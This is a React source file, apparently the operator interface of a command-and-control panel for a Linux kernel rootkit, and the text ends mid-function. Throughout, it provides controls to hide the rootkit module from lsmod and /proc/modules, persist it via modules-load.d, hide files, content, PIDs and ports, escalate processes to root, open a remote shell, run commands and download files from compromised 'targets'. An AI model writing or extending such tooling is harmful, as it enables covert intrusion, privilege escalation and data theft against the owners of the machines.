import { useState, useRef, useEffect, useCallback } from 'react'
import {
  ArrowLeft, RefreshCw, Search, Shield, Network,
  SquareTerminal, Folder, FileText, ChevronRight,
  Eye, EyeOff, Loader, Clock, Activity, Radio, Zap, Download,
} from 'lucide-react'
import { Badge, StatusPill } from '../components/Badge'
import { CmdBar } from '../components/CmdBar'

const _cache = new Map()
function useSnapshot(key) {
  const cached = _cache.get(key) || { data: null, time: null }
  const [data, setData] = useState(cached.data)
  const [time, setTime] = useState(cached.time)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)
  const set = useCallback((d) => {
    const now = new Date()
    _cache.set(key, { data: d, time: now })
    setData(d)
    setTime(now)
    setError(null)
    setLoading(false)
  }, [key])
  const fail = useCallback((e) => { setError(e); setTime(new Date()); setLoading(false) }, [])
  return { data, time, loading, setLoading, error, set, fail }
}

const TABS = [
  { key: 'overview', label: 'Overview' },
  { key: 'files', label: 'Files' },
  { key: 'procs', label: 'Processes' },
  { key: 'ports', label: 'Ports' },
  { key: 'shell', label: 'Shell', icon: SquareTerminal },
  { key: 'log', label: 'Command Log' },
  { key: 'events', label: 'Events' },
]

export function Target({ target: t, log, events, sendCmd, query, execCmd, downloadFile, onBack }) {
  const [tab, setTab] = useState('overview')

  if (!t) return (
    <div className="flex items-center justify-center h-full">
      <p className="text-fg-3 font-bold text-lg">Target not found</p>
    </div>
  )

  const targetLog = log.filter(l => l.target === t.id)
  const hiddenFiles = t.hidden?.file || []
  const hiddenContent = t.hidden?.content || []
  const hiddenPids = t.hidden?.pid || []
  const hiddenPorts = t.hidden?.port || []
  const tabCounts = {
    overview: null, shell: null,
    files: hiddenFiles.length + hiddenContent.length,
    procs: hiddenPids.length || null,
    ports: hiddenPorts.length || null,
    log: targetLog.length,
    events: events.length,
  }

  const cmd = (command) => sendCmd(command, t.id)

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="flex items-center gap-4 px-5 py-3 border-b-2 border-border bg-secondary">
        <button className="nb-btn p-1.5 shrink-0" onClick={onBack}>
          <ArrowLeft size={16} />
        </button>
        <h1 className="text-xl font-bold truncate">{(t.hostname && t.hostname !== '(none)') ? t.hostname : t.id}</h1>
        <Badge label={t.online ? 'Online' : 'Offline'} color={t.online ? 'green' : 'red'} />
        <div className="hidden sm:flex items-center gap-4 text-xs font-mono text-fg-3 ml-1">
          <span>{t.id}</span>
          <span>{t.kernel} {t.arch}</span>
          {t.module_hidden && <span className="text-green font-bold flex items-center gap-1"><Shield size={12} />Hidden</span>}
        </div>
        <div className="ml-auto shrink-0">
          <button className="nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5" onClick={() => cmd('PING')}>
            <RefreshCw size={14} /> Ping
          </button>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex border-b-2 border-border bg-secondary overflow-x-auto">
        {TABS.map(({ key, label, icon: TabIcon }) => (
          <button
            key={key}
            className={`px-4 py-2.5 text-sm font-bold whitespace-nowrap flex items-center gap-2 border-r border-border transition-colors shrink-0
              ${tab === key ? 'bg-main text-main-fg' : 'hover:bg-bg-2'}`}
            onClick={() => setTab(key)}
          >
            {TabIcon && <TabIcon size={14} />}
            {label}
            {tabCounts[key] !== null && tabCounts[key] > 0 && (
              <span className={`text-xs px-1.5 py-0.5 font-mono rounded-[var(--radius)] border-2 border-border
                ${tab === key ? 'bg-secondary text-fg' : 'bg-bg-2'}`}>
                {tabCounts[key]}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-auto min-h-0">
        {tab === 'overview' && <OverviewTab target={t} cmd={cmd} query={query} />}
        {tab === 'files' && <FilesTab target={t} cmd={cmd} query={query} execCmd={execCmd} downloadFile={downloadFile} />}
        {tab === 'procs' && <ProcsTab target={t} cmd={cmd} query={query} execCmd={execCmd} />}
        {tab === 'ports' && <PortsTab target={t} cmd={cmd} execCmd={execCmd} />}
        {tab === 'shell' && <ShellTab target={t} />}
        {tab === 'log' && <LogTab entries={targetLog} />}
        {tab === 'events' && <EventsTab events={events} />}
      </div>

      <CmdBar onSend={cmd} query={query} targetId={t.id} />
    </div>
  )
}

/* -- Overview ------------------------------------------------ */

function OverviewTab({ target: t, cmd, query }) {
  const [persistPending, setPersistPending] = useState(false)
  const hidden = {
    file: (t.hidden?.file || []).length,
    pid: (t.hidden?.pid || []).length,
    port: (t.hidden?.port || []).length,
    content: (t.hidden?.content || []).length,
  }
  const total = hidden.file + hidden.pid + hidden.port + hidden.content

  const togglePersist = useCallback(() => {
    setPersistPending(true)
    query(t.persisted ? 'UNPERSIST' : 'PERSIST', t.id).then(() => setPersistPending(false))
  }, [query, t.id, t.persisted])

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-0 h-full">
      {/* Col 1: module + actions */}
      <div className="border-b-2 lg:border-b-0 lg:border-r-2 border-border p-5 space-y-5 overflow-auto">
        <Section title="Module Control">
          <div className="nb-card-flat p-4 flex items-center justify-between gap-4">
            <div className="min-w-0">
              <div className="font-bold">Module Visibility</div>
              <div className="text-xs text-fg-3 mt-1">Hide from lsmod, /proc/modules</div>
            </div>
            <div className="flex items-center gap-3 shrink-0">
              <span className={`text-xs font-bold uppercase ${t.module_hidden ? 'text-green' : 'text-fg-3'}`}>
                {t.module_hidden ? 'hidden' : 'visible'}
              </span>
              <button
                className={`nb-btn px-3 py-1.5 text-sm ${t.module_hidden ? '' : 'bg-green text-white'}`}
                onClick={() => cmd(t.module_hidden ? 'UNHIDE MODULE' : 'HIDE MODULE')}
                disabled={!t.online}
              >
                {t.module_hidden ? 'Unhide' : 'Hide'}
              </button>
            </div>
          </div>
          <div className="nb-card-flat p-4 flex items-center justify-between gap-4 mt-2">
            <div className="min-w-0">
              <div className="font-bold">Persistence</div>
              <div className="text-xs text-fg-3 mt-1">Survive reboot via modules-load.d</div>
            </div>
            <div className="flex items-center gap-3 shrink-0">
              <span className={`text-xs font-bold uppercase ${t.persisted ? 'text-green' : 'text-fg-3'}`}>
                {t.persisted ? 'active' : 'off'}
              </span>
              {persistPending && <Loader size={12} className="animate-spin text-fg-3" />}
              <button
                className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.persisted ? 'bg-green text-white' : ''}`}
                onClick={togglePersist}
                disabled={!t.online || persistPending}
              >
                <Shield size={12} /> {t.persisted ? 'Unpersist' : 'Persist'}
              </button>
            </div>
          </div>
        </Section>

      </div>

      {/* Col 2: hidden items */}
      <div className="border-b-2 lg:border-b-0 lg:border-r-2 border-border p-5 overflow-auto">
        <Section title={<>Hidden <span className="nb-badge bg-main text-main-fg ml-1">{total}</span></>}>
          {total > 0 && (
            <button className="nb-btn px-3 py-1.5 text-xs text-red mb-3" onClick={() => cmd('UNHIDE ALL')} disabled={!t.online}>
              Unhide All
            </button>
          )}
          {total === 0 && (
            <div className="text-sm text-fg-3 py-4">Nothing hidden yet. Use the Processes, Ports, or Files tabs to hide items.</div>
          )}
          {[
            { key: 'file', label: 'Files', icon: FileText, items: t.hidden?.file || [], unhidCmd: 'UNHIDE FILE' },
            { key: 'pid', label: 'PIDs', icon: Activity, items: t.hidden?.pid || [], unhidCmd: 'UNHIDE PID' },
            { key: 'port', label: 'Ports', icon: Network, items: t.hidden?.port || [], unhidCmd: 'UNHIDE PORT' },
            { key: 'content', label: 'Content', icon: Search, items: t.hidden?.content || [], unhidCmd: 'UNHIDE CONTENT' },
          ].filter(c => c.items.length > 0).map(cat => (
            <div key={cat.key} className="mb-3">
              <div className="flex items-center gap-1.5 mb-1.5">
                <cat.icon size={12} className="text-fg-3" />
                <span className="text-[10px] font-bold uppercase tracking-widest text-fg-3">{cat.label}</span>
                <span className="text-[10px] font-mono text-fg-3">{cat.items.length}</span>
              </div>
              <div className="space-y-0.5">
                {cat.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between gap-2 px-3 py-1.5 rounded-[var(--radius)] bg-secondary border border-border group">
                    <span className="font-mono text-xs truncate">{item}</span>
                    <button
                      className="p-0.5 text-fg-3 hover:text-red opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                      title={`Unhide ${item}`}
                      onClick={() => cmd(`${cat.unhidCmd} ${i}`)}
                      disabled={!t.online}
                    >
                      <Eye size={12} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </Section>
      </div>

      {/* Col 3: system info */}
      <div className="p-5 overflow-auto">
        <Section title="System">
          <div className="nb-card-flat overflow-hidden">
            <InfoRow label="Hostname" value={t.hostname || t.id} />
            <InfoRow label="ID" value={t.id} />
            <InfoRow label="Kernel" value={`${t.kernel} ${t.arch}`} />
            {t.build_id && <InfoRow label="Build" value={t.build_id} />}
            {t.peer && <InfoRow label="Peer" value={t.peer} />}
            <InfoRow label="Module" value={t.module_hidden ? 'Hidden' : 'Visible'} color={t.module_hidden ? 'text-green' : 'text-amber'} />
            <InfoRow label="Status" value={t.online ? 'Online' : 'Offline'} color={t.online ? 'text-green' : 'text-red'} />
            <InfoRow label="Hidden" value={`${total} items`} />
          </div>
        </Section>
      </div>
    </div>
  )
}

function Section({ title, children }) {
  return (
    <div>
      <h3 className="text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">{title}</h3>
      {children}
    </div>
  )
}

function InfoRow({ label, value, color }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5 border-b-2 border-border last:border-b-0">
      <span className="text-xs font-bold uppercase tracking-wider text-fg-3">{label}</span>
      <span className={`font-mono text-sm ${color || ''}`}>{value}</span>
    </div>
  )
}

/* -- File Browser -------------------------------------------- */

function resolvePath(input, cwd) {
  if (!input.startsWith('/')) input = cwd + (cwd === '/' ? '' : '/') + input
  const parts = input.split('/').filter(Boolean)
  const resolved = []
  for (const p of parts) {
    if (p === '.') continue
    if (p === '..') { resolved.pop(); continue }
    resolved.push(p)
  }
  return '/' + resolved.join('/')
}

function formatSize(bytes) {
  if (bytes === 0) return '0'
  if (bytes < 1024) return bytes + ' B'
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' K'
  return (bytes / 1048576).toFixed(1) + ' M'
}

function parseShellLs(output) {
  if (!output) return []
  return output.split('\n').filter(line => line && !line.startsWith('total ')).map(line => {
    const parts = line.split(/\s+/)
    if (parts.length < 6) return null
    const perms = parts[0]
    if (!/^[dlcbsp-]/.test(perms)) return null
    const size = parseInt(parts[4], 10) || 0
    // busybox ls -la may have fewer columns than coreutils
    const nameIdx = parts.findIndex((p, i) => i >= 5 && /^\d{1,2}:\d{2}$/.test(p))
    const name = (nameIdx >= 0 ? parts.slice(nameIdx + 1) : parts.slice(8)).join(' ').trim()
    if (!name || name === '.' || name === '..') return null
    return { name, type: perms[0] === 'd' ? 'd' : perms[0] === 'l' ? 'l' : 'f', size, perms }
  }).filter(Boolean)
}

function FilesTab({ target: t, cmd, query, execCmd, downloadFile }) {
  const [cwd, setCwd] = useState('/')
  const [pathInput, setPathInput] = useState('/')
  const [pathError, setPathError] = useState(false)
  const [selected, setSelected] = useState(null)
  const [panel, setPanel] = useState('explorer')
  const [dlStatus, setDlStatus] = useState({})
  const [preview, setPreview] = useState(null)

  const doDownload = useCallback((path) => {
    if (!downloadFile) return
    setDlStatus(s => ({ ...s, [path]: { state: 'pending', received: 0, total: 0 } }))
    const onProgress = (received, total) => {
      setDlStatus(s => ({ ...s, [path]: { state: 'pending', received, total } }))
    }
    downloadFile(path, t.id, onProgress).then(r => {
      if (r.ok) {
        setDlStatus(s => ({ ...s, [path]: { state: 'done' } }))
        const raw = Uint8Array.from(atob(r.data), c => c.charCodeAt(0))
        const blob = new Blob([raw])
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a')
        a.href = url
        a.download = path.split('/').pop() || 'download'
        a.click()
        URL.revokeObjectURL(url)
        try {
          const text = new TextDecoder('utf-8', { fatal: true }).decode(raw)
          setPreview({ path, content: text, size: r.size })
        } catch {
          setPreview({ path, content: '(binary file)', size: r.size })
        }
      } else {
        setDlStatus(s => ({ ...s, [path]: { state: 'error' } }))
      }
      setTimeout(() => setDlStatus(s => { const n = { ...s }; delete n[path]; return n }), 3000)
    })
  }, [downloadFile, t.id])
  const snap = useSnapshot(`files:${t.id}:${cwd}`)
  const hiddenFiles = t.hidden?.file || []
  const hiddenContent = t.hidden?.content || []

  const fetchDir = useCallback((path, force) => {
    if (!force) {
      const key = `files:${t.id}:${path}`
      const cached = _cache.get(key)
      if (cached?.data) return
    }
    snap.setLoading(true)
    execCmd(`ls -la --color=never ${path}`, t.id).then(result => {
      if (result.ok) {
        snap.set(parseShellLs(result.output))
      } else {
        snap.fail(result.output || 'failed')
      }
      snap.setLoading(false)
    })
  }, [execCmd, t.id, snap])

  useEffect(() => { fetchDir(cwd) }, [cwd, fetchDir])

  const navigateTo = (path) => {
    const resolved = resolvePath(path, cwd)
    setCwd(resolved)
    setPathInput(resolved)
    setPathError(false)
  }

  const submitPath = (e) => {
    e.preventDefault()
    const resolved = resolvePath(pathInput, cwd)
    setCwd(resolved)
    setPathInput(resolved)
  }

  const isHidden = (name) => {
    const full = cwd === '/' ? `/${name}` : `${cwd}/${name}`
    return hiddenFiles.some(h => h === name || h === full || full.endsWith(`/${h}`))
      || hiddenContent.some(pattern => name.includes(pattern))
  }

  return (
    <div className="flex flex-col h-full">
      {/* Path bar */}
      <div className="flex items-center gap-2 px-4 py-2.5 border-b-2 border-border bg-bg-2">
        <button className="nb-btn p-1.5" onClick={() => navigateTo('..')} title="Up">
          <ArrowLeft size={14} />
        </button>
        <button className="nb-btn p-1.5" onClick={() => fetchDir(cwd, true)} title="Refresh">
          <RefreshCw size={14} />
        </button>
        <form className="flex-1 min-w-0" onSubmit={submitPath}>
          <input
            className={`w-full font-mono text-sm px-3 py-1.5 rounded-[var(--radius)] border-2 bg-secondary outline-none transition-colors
              ${pathError ? 'border-red text-red' : 'border-border focus:shadow-[var(--shadow-offset)_var(--shadow-offset)_0px_0px_var(--color-border)]'}`}
            value={pathInput}
            onChange={e => setPathInput(e.target.value)}
            onBlur={() => { setPathInput(cwd); setPathError(false) }}
            onKeyDown={e => { if (e.key === 'Escape') { setPathInput(cwd); e.target.blur() } }}
            spellCheck={false}
          />
        </form>
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0">
          <button
            className={`px-3 py-1.5 text-sm font-bold ${panel === 'explorer' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('explorer')}
          >
            Explorer
          </button>
          <button
            className={`px-3 py-1.5 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >
            Hidden {hiddenFiles.length + hiddenContent.length}
          </button>
        </div>
      </div>

      {panel === 'explorer' ? (
        <>
          {/* Column headers */}
          <div className="grid grid-cols-[1fr_80px_70px] px-4 py-2 border-b-2 border-border bg-secondary text-xs font-bold uppercase tracking-wider text-fg-3">
            <span>Name</span>
            <span>Size</span>
            <span className="text-right">Actions</span>
          </div>

          {/* File listing */}
          <div className="flex-1 overflow-auto">
            {snap.loading ? (
              <div className="flex items-center justify-center gap-2 p-8 text-fg-3">
                <Loader size={16} className="animate-spin" /> Loading...
              </div>
            ) : snap.error ? (
              <div className="p-8 text-center">
                <div className="text-red font-bold mb-1">Failed</div>
                <div className="text-sm text-fg-3 font-mono">{snap.error}</div>
              </div>
            ) : (snap.data || []).length ? (snap.data || []).map(entry => {
              const h = isHidden(entry.name)
              const isDir = entry.type === 'd'
              const sel = selected === entry.name
              const fullPath = cwd === '/' ? `/${entry.name}` : `${cwd}/${entry.name}`
              return (
                <div
                  key={entry.name}
                  className={`grid grid-cols-[1fr_80px_70px] px-4 py-2 border-b border-border cursor-pointer transition-colors group
                    ${sel ? 'bg-main/10' : 'hover:bg-bg-2'}
                    ${h ? 'opacity-40' : ''}`}
                  onClick={() => isDir ? navigateTo(entry.name) : setSelected(sel ? null : entry.name)}
                >
                  <div className="flex items-center gap-2 min-w-0">
                    {isDir
                      ? <Folder size={16} className="text-amber shrink-0" />
                      : <FileText size={16} className="text-fg-3 shrink-0" />}
                    <span className={`font-mono text-sm truncate ${isDir ? 'font-bold' : ''}`}>{entry.name}</span>
                    {isDir && <ChevronRight size={12} className="text-fg-3 shrink-0" />}
                    {h && <span className="nb-badge bg-red text-white text-[10px] py-0 px-1.5 shrink-0">hidden</span>}
                  </div>
                  <span className="font-mono text-sm text-fg-3 self-center">
                    {isDir ? '-' : formatSize(entry.size)}
                  </span>
                  <div className="flex items-center justify-end gap-1 self-center">
                    {!isDir && (() => {
                      const dl = dlStatus[fullPath]
                      const pending = dl?.state === 'pending'
                      const pct = pending && dl.total ? Math.round(dl.received * 100 / dl.total) : 0
                      return (
                        <button
                          className={`p-1 transition-opacity ${pending ? 'text-main opacity-100' : 'text-fg-3 hover:text-main opacity-0 group-hover:opacity-100'}`}
                          title={pending && dl.total ? `${pct}%` : 'Download'}
                          onClick={e => { e.stopPropagation(); doDownload(fullPath) }}
                          disabled={pending}
                        >
                          {pending
                            ? (dl.total
                              ? <span className="text-[10px] font-mono font-bold tabular-nums">{pct}%</span>
                              : <Loader size={14} className="animate-spin" />)
                            : <Download size={14} />}
                        </button>
                      )
                    })()}
                    <button
                      className={`p-1 transition-opacity ${h ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                      title={h ? 'Unhide' : 'Hide'}
                      onClick={e => {
                        e.stopPropagation()
                        if (h) {
                          const idx = hiddenFiles.indexOf(entry.name)
                          if (idx >= 0) cmd(`UNHIDE FILE ${idx}`)
                        } else {
                          cmd(`HIDE FILE ${entry.name}`)
                        }
                      }}
                    >
                      {h ? <Eye size={14} /> : <EyeOff size={14} />}
                    </button>
                  </div>
                </div>
              )
            }) : (
              <div className="p-8 text-center text-fg-3">Empty directory</div>
            )}
          </div>

          {/* Status bar */}
          <div className="flex items-center justify-between px-4 py-2.5 border-t-2 border-border bg-bg-2 text-sm text-fg-3">
            <span className="font-mono text-xs">{(snap.data || []).length} items{selected ? ' / 1 selected' : ''}{snap.time ? ` / ${timeAgo(snap.time)}` : ''}</span>
            <button className="nb-btn px-3 py-1 text-xs flex items-center gap-1.5"
              onClick={() => {
                if (selected) cmd(`HIDE FILE ${selected}`)
              }}
              disabled={!selected}
            >
              <EyeOff size={12} /> Hide Selected
            </button>
          </div>
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden Files" icon={FileText} items={hiddenFiles}
            onRemove={i => cmd(`UNHIDE FILE ${i}`)} onAdd={v => cmd(`HIDE FILE ${v}`)} placeholder="/etc/secret.conf" />
          <HiddenSummary title="Hidden Content" icon={Search} items={hiddenContent}
            onRemove={i => cmd(`UNHIDE CONTENT ${i}`)} onAdd={v => cmd(`HIDE CONTENT ${v}`)} placeholder="rootkit" />
        </div>
      )}

      {preview && (
        <div className="absolute inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setPreview(null)}>
          <div className="bg-bg border-2 border-border rounded-[var(--radius)] shadow-lg w-full max-w-2xl max-h-[80vh] flex flex-col" onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between px-4 py-3 border-b-2 border-border bg-secondary">
              <div className="flex items-center gap-2 min-w-0">
                <Download size={14} className="text-main shrink-0" />
                <span className="font-mono text-sm font-bold truncate">{preview.path}</span>
              </div>
              <div className="flex items-center gap-3 shrink-0">
                <span className="text-xs text-fg-3">{preview.size} bytes</span>
                <button className="nb-btn px-2 py-1 text-xs" onClick={() => setPreview(null)}>Close</button>
              </div>

            </div>
            <pre className="flex-1 overflow-auto p-4 text-xs font-mono whitespace-pre-wrap break-all">{preview.content}</pre>
          </div>
        </div>
      )}
    </div>
  )
}

function HiddenSummary({ title, icon: Icon, items, onRemove, onAdd, placeholder }) {
  const [val, setVal] = useState('')
  const submit = () => { if (val.trim()) { onAdd(val.trim()); setVal('') } }

  return (
    <div className="border-b-2 border-border">
      <div className="flex items-center justify-between px-4 py-3 bg-bg-2">
        <div className="flex items-center gap-2">
          <Icon size={16} className="text-fg-3" />
          <span className="text-sm font-bold uppercase tracking-wider">{title}</span>
          <span className="nb-badge bg-main text-main-fg">{items.length}</span>
        </div>
        <div className="flex items-center gap-2">
          <input className="nb-input px-3 py-1.5 text-sm w-44" placeholder={placeholder}
            value={val} onChange={e => setVal(e.target.value)} onKeyDown={e => e.key === 'Enter' && submit()} />
          <button className="nb-btn px-3 py-1.5 text-sm" onClick={submit}>+ Add</button>
        </div>
      </div>
      {items.length ? items.map((v, i) => (
        <div key={i} className="flex items-center justify-between px-4 py-2.5 border-t-2 border-border hover:bg-bg-2 group">
          <div className="flex items-center gap-3">
            <span className="text-sm font-mono text-fg-3 w-6">{i}</span>
            <span className="font-mono text-sm">{v}</span>
          </div>
          <button className="text-sm font-bold text-red opacity-0 group-hover:opacity-100 hover:underline"
            onClick={() => onRemove(i)}>remove</button>
        </div>
      )) : (
        <div className="px-4 py-6 text-center text-fg-3 border-t-2 border-border">None</div>
      )}
    </div>
  )
}

/* -- Snapshot bar (shared) ----------------------------------- */

function SnapshotBar({ title, icon: Icon, count, hiddenCount, time, loading, onSnapshot, online, children }) {
  const ago = time ? timeAgo(time) : null
  return (
    <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-bg-2">
      {Icon && <Icon size={14} className="text-fg-3" />}
      <span className="text-sm font-bold uppercase tracking-wide">{title}</span>
      {count > 0 && <span className="nb-badge bg-main text-main-fg">{count}</span>}
      {hiddenCount > 0 && <span className="nb-badge bg-red text-white">{hiddenCount} hidden</span>}
      {children}
      <div className="ml-auto flex items-center gap-2">
        {ago && (
          <span className="text-[11px] text-fg-3 flex items-center gap-1 tabular-nums">
            <Clock size={10} /> {ago}
          </span>
        )}
        <button className="nb-btn p-1.5" onClick={onSnapshot} disabled={!online || loading} title="Refresh snapshot">
          <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
        </button>
      </div>
    </div>
  )
}

function EmptySnapshotCta({ icon: Icon, title, subtitle, onCapture, online, loading }) {
  return (
    <div className="flex-1 flex items-center justify-center">
      <div className="text-center">
        <div className="mx-auto w-12 h-12 rounded-lg bg-main/10 flex items-center justify-center mb-4">
          <Icon size={22} className="text-main" />
        </div>
        <div className="font-bold mb-0.5">{title}</div>
        <div className="text-xs text-fg-3 mb-4">{subtitle}</div>
        <button className="nb-btn-main px-4 py-2 text-sm font-bold flex items-center gap-2 mx-auto" onClick={onCapture} disabled={!online || loading}>
          {loading ? <Loader size={14} className="animate-spin" /> : <Radio size={14} />}
          {loading ? 'Scanning...' : 'Capture'}
        </button>
      </div>
    </div>
  )
}

function timeAgo(date) {
  const s = Math.floor((Date.now() - date.getTime()) / 1000)
  if (s < 5) return 'just now'
  if (s < 60) return `${s}s ago`
  if (s < 3600) return `${Math.floor(s / 60)}m ago`
  return date.toLocaleTimeString()
}

/* -- Processes ----------------------------------------------- */

const PS_CMD = "for d in /proc/[0-9]*; do u=$(stat -c %u \"$d\" 2>/dev/null); cat \"$d/stat\" 2>/dev/null | sed \"s/^/$u /\"; done"

function ProcsTab({ target: t, cmd, query, execCmd }) {
  const snap = useSnapshot(`procs:${t.id}`)
  const [filter, setFilter] = useState('')
  const [panel, setPanel] = useState('scan')
  const [escPid, setEscPid] = useState('')
  const [escStatus, setEscStatus] = useState(null)
  const hiddenPids = t.hidden?.pid || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PS_CMD, t.id).then(r => {
      if (r.ok) {
        const parsed = r.output.split('\n').filter(Boolean).map(line => {
          const m = line.match(/^(\d+)\s+(\d+)\s+\((.+?)\)\s+(\S+)\s+(\d+)/)
          if (!m) return null
          return { uid: m[1], pid: m[2], comm: m[3], stat: m[4], ppid: m[5] }
        }).filter(Boolean)
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
      snap.setLoading(false)
    })
  }, [execCmd, t.id, snap])

  const doEscalate = useCallback((pid) => {
    setEscStatus('pending')
    query(`ESCALATE ${pid}`, t.id).then(r => {
      setEscStatus(r.ok ? 'ok' : 'error')
      if (r.ok) setEscPid('')
      setTimeout(() => { setEscStatus(null); capture() }, 1500)
    })
  }, [query, t.id, capture])

  const procs = snap.data || []
  const filtered = filter
    ? procs.filter(p => p.comm.includes(filter) || p.pid === filter || p.ppid === filter || p.uid === filter)
    : procs

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Activity} title="Processes"
      subtitle="Scan /proc for running processes (close any active shell first)"
      onCapture={capture} online={t.online} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="Processes" icon={Activity} count={procs.length} hiddenCount={hiddenPids.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online}>
        <input className="nb-input px-3 py-1 text-sm w-40 ml-2" placeholder="filter..."
          value={filter} onChange={e => setFilter(e.target.value)} />
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 ml-2">
          <button
            className={`px-3 py-1 text-sm font-bold ${panel === 'scan' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('scan')}
          >Scan</button>
          <button
            className={`px-3 py-1 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >Hidden {hiddenPids.length}</button>
        </div>
      </SnapshotBar>
      {panel === 'scan' ? (
        <>
          {snap.error && (
            <div className="p-6 text-center">
              <div className="text-red font-bold mb-1">Scan failed</div>
              <div className="text-sm text-fg-3">{snap.error.includes('ticket') || snap.error.includes('busy')
                ? 'Close the active shell session first, then retry.'
                : snap.error}</div>
            </div>
          )}
          {!snap.error && !filtered.length && !snap.loading ? (
            <div className="flex-1 flex items-center justify-center text-fg-3 text-sm">
              {procs.length ? 'No matches' : 'No processes found'}
            </div>
          ) : !snap.error && filtered.length > 0 && (
          <div className="flex-1 overflow-auto">
            <table className="w-full text-sm">
              <thead className="sticky top-0 bg-secondary border-b-2 border-border">
                <tr><Th>PID</Th><Th>User</Th><Th>PPID</Th><Th>State</Th><Th>Command</Th><Th></Th></tr>
              </thead>
              <tbody>
                {filtered.map(p => {
                  const isHidden = hiddenPids.includes(p.pid)
                  const isRoot = p.uid === '0'
                  return (
                    <tr key={p.pid} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                      <td className="px-4 py-2 font-mono">{p.pid}</td>
                      <td className={`px-4 py-2 font-mono ${isRoot ? 'text-red font-bold' : 'text-fg-3'}`}>{isRoot ? 'root' : p.uid}</td>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.ppid}</td>
                      <td className="px-4 py-2 font-mono">{p.stat}</td>
                      <td className="px-4 py-2 font-mono">{p.comm}</td>
                      <td className="px-4 py-2 text-right flex items-center justify-end gap-1">
                        <button
                          className="p-1 text-fg-3 hover:text-amber opacity-0 group-hover:opacity-100 transition-opacity"
                          title="Escalate to root"
                          onClick={(e) => { e.stopPropagation(); doEscalate(p.pid) }}
                          disabled={!t.online || isRoot}
                        >
                          <Zap size={14} />
                        </button>
                        <button
                          className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                          title={isHidden ? 'Unhide PID' : 'Hide PID'}
                          onClick={() => {
                            if (isHidden) {
                              const idx = hiddenPids.indexOf(p.pid)
                              if (idx >= 0) cmd(`UNHIDE PID ${idx}`)
                            } else {
                              cmd(`HIDE PID ${p.pid}`)
                            }
                          }}
                        >
                          {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                        </button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
          )}
          {/* Escalate bar */}
          <div className="flex items-center gap-2 px-4 py-2.5 border-t-2 border-border bg-bg-2">
            <Zap size={14} className="text-amber shrink-0" />
            <span className="text-sm font-bold uppercase tracking-wide text-fg-3">Escalate</span>
            <input className="nb-input px-3 py-1.5 text-sm w-32 font-mono" placeholder="PID"
              value={escPid} onChange={e => setEscPid(e.target.value.replace(/\D/g, ''))}
              onKeyDown={e => e.key === 'Enter' && escPid && doEscalate(escPid)} />
            <button className="nb-btn px-3 py-1.5 text-sm font-bold" disabled={!escPid || !t.online || escStatus === 'pending'}
              onClick={() => doEscalate(escPid)}>
              {escStatus === 'pending' ? 'Escalating...' : 'Root'}
            </button>
            {escStatus === 'ok' && <span className="text-xs font-bold text-green">Escalated</span>}
            {escStatus === 'error' && <span className="text-xs font-bold text-red">Failed</span>}
          </div>
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden PIDs" icon={Activity} items={hiddenPids}
            onRemove={i => cmd(`UNHIDE PID ${i}`)} onAdd={v => cmd(`HIDE PID ${v}`)} placeholder="1234" />
        </div>
      )}
    </div>
  )
}

/* -- Ports --------------------------------------------------- */

const PORTS_CMD = "netstat -tn 2>/dev/null || cat /proc/net/tcp"

function PortsTab({ target: t, cmd, execCmd }) {
  const snap = useSnapshot(`ports:${t.id}`)
  const hiddenPorts = t.hidden?.port || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PORTS_CMD, t.id).then(r => {
      if (r.ok) {
        const lines = r.output.split('\n').filter(Boolean)
        let parsed
        const hdrIdx = lines.findIndex(l => l.trim().startsWith('Proto'))
        if (hdrIdx >= 0) {
          parsed = lines.slice(hdrIdx + 1).map(line => {
            const parts = line.trim().split(/\s+/)
            if (parts.length < 6) return null
            const local = parts[3] || ''
            const foreign = parts[4] || ''
            const portMatch = local.match(/:(\d+)$/)
            const port = portMatch ? portMatch[1] : ''
            return { proto: parts[0], local, foreign, port, state: parts[5] }
